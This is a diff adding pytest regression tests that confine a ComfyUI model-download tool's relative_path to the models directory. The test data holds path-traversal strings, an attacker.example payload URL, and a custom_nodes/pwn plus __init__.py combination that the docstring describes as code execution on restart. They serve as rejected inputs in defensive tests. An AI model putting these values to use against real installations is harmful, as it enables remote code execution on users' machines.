@@ -23,6 +23,7 @@ import subprocess
 import sys
 import threading
 import time
+from pathlib import PurePosixPath
 
 import pytest
 from conftest import _OK_STREAM, _FakeProc, _RecordingCtx, envelope
@@ -1051,6 +1052,178 @@ def test_download_model_accepts_dotted_but_ordinary_relative_path(
 
     cmd = calls[0]["cmd"]
     assert cmd[cmd.index("--relative-path") + 1] == good_path
+
+
+# --- relative_path must land in the MODELS tree, not just inside the workspace -
+#
+# comfy-cli joins `--relative-path` to the WORKSPACE ROOT (`local_filepath =
+# get_workspace() / relative_path / local_filename`, defaulting to
+# `DEFAULT_COMFY_MODEL_PATH = "models"`) — which is why the documented shape is
+# `models/loras` rather than a bare `loras`. Every value below is traversal-clean,
+# so the checks above pass it happily; only the first-segment check keeps the
+# write out of the workspace's other top-level directories.
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    [
+        "custom_nodes/pwn",  # ComfyUI's import path — see the RCE pin below
+        "custom_nodes/x/y",  # deeper, same tree
+        "user",  # sibling top-level workspace dirs
+        "input",
+        "output",
+        "web",
+        "loras",  # a BARE folder name is rejected, not assumed to mean models/
+        "modelsx",  # a prefix of `models` is a different directory
+        "models2/loras",
+        "Models/loras",  # matched exactly: no case-folding a security guard
+        "~",  # comfy-cli expanduser()s this, escaping the workspace entirely
+        "~/evil",
+    ],
+)
+def test_download_model_rejects_non_models_relative_path(bad_path, patched_run):
+    """A traversal-clean ``relative_path`` that does not start at ``models`` is
+    refused before any child spawns."""
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match="invalid relative_path"):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+def test_download_model_rejects_custom_nodes_init_py_rce(patched_run):
+    """Named regression pin for the RCE shape this check exists for.
+
+    ComfyUI imports `custom_nodes/*/__init__.py` on startup, so a write there is
+    attacker-controlled code on the import path — code execution on the next
+    ComfyUI restart, on every platform. Both arguments are individually legal
+    (`custom_nodes/pwn` is traversal-clean; `__init__.py` is a bare filename);
+    it is the models-tree confinement that refuses the combination.
+    """
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match="invalid relative_path"):
+        server.download_model(
+            "https://attacker.example/payload",
+            relative_path="custom_nodes/pwn",
+            filename="__init__.py",
+        )
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    ["../../etc", "models/../../etc", "/abs/models", "C:evil", "models/.. /evil"],
+)
+def test_download_model_traversal_still_reports_as_traversal(bad_path, patched_run):
+    """Ordering pin: the models-tree check runs AFTER the traversal checks, so a
+    traversal string keeps its own (more specific) diagnosis rather than being
+    relabelled as a wrong-folder error."""
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match=r"invalid relative_path.*traversal"):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    "good_path",
+    [
+        "models",  # the models dir itself
+        "models/loras",
+        "models/checkpoints",
+        "models/loras/",  # trailing slash: an empty trailing segment
+        "models//loras",  # doubled slash
+    ],
+)
+def test_download_model_forwards_models_relative_path_unchanged(good_path, patched_run):
+    """Accepted values are forwarded to comfy-cli VERBATIM — the guard rejects,
+    it never rewrites the argument."""
+    calls = patched_run(envelope(data={}))
+
+    server.download_model("https://hf.co/x.safetensors", relative_path=good_path)
+
+    cmd = calls[0]["cmd"]
+    assert cmd[cmd.index("--relative-path") + 1] == good_path
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    [
+        "models\\loras",  # the case below, as a plain parametrization
+        "models\\checkpoints\\sdxl",
+        "models\\",  # trailing separator, still a `\`
+        "models/loras\\ckpt",  # mixed spelling
+    ],
+)
+def test_download_model_rejects_backslash_relative_path(bad_path, patched_run):
+    """A `\\` separator is refused even when every segment is otherwise legal.
+
+    The guard splits on `\\` to decide, but comfy-cli receives the value verbatim
+    — so on a POSIX host the two disagree and the write misses the models tree
+    (see the named pin below). `/` reaches the same directory on Windows, so this
+    costs a spelling, not a destination.
+    """
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match=r"invalid relative_path.*separator"):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+def test_download_model_rejects_backslash_escaping_models_tree(patched_run):
+    """Named regression pin for what the `\\` rejection actually prevents.
+
+    `models\\loras` splits to segments `models` + `loras`, so the first-segment
+    check passes it — but pathlib on a POSIX host reads the backslash as an
+    ordinary character, making `<workspace>/models\\loras` a top-level directory
+    SIBLING of the models dir rather than a folder inside it. The write would land
+    outside the tree the guard claims to confine it to.
+    """
+    calls = patched_run(envelope(data={}))
+
+    # Pin the mechanism, so this test fails loudly if pathlib ever changes: the
+    # backslash is one literal path component, not a separator, off POSIX.
+    assert (PurePosixPath("/ws") / "models\\loras").parts == (
+        "/",
+        "ws",
+        "models\\loras",
+    )
+
+    with pytest.raises(server.ComfyCliError, match="invalid relative_path"):
+        server.download_model(
+            "https://attacker.example/payload", relative_path="models\\loras"
+        )
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    ("bad_path", "expected"),
+    [
+        # Ordering pin: the `\` check runs LAST, so the security-meaningful
+        # diagnoses keep their own (more specific) message.
+        ("models\\..\\evil", "traversal"),  # `\`-split makes `..` a real segment
+        ("\\evil", "traversal"),  # root-relative: an empty leading segment
+        ("custom_nodes\\pwn", "must be the models dir"),  # wrong tree first
+        ("loras\\x", "must be the models dir"),
+    ],
+)
+def test_download_model_backslash_check_is_ordered_last(
+    bad_path, expected, patched_run
+):
+    """A `\\` value that is ALSO a traversal or a wrong-tree value reports as that,
+    not as a separator-spelling complaint."""
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match=expected):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
 
 
 @pytest.mark.parametrize("bad_name", [".. ", "...", ". ", "... ", " "])
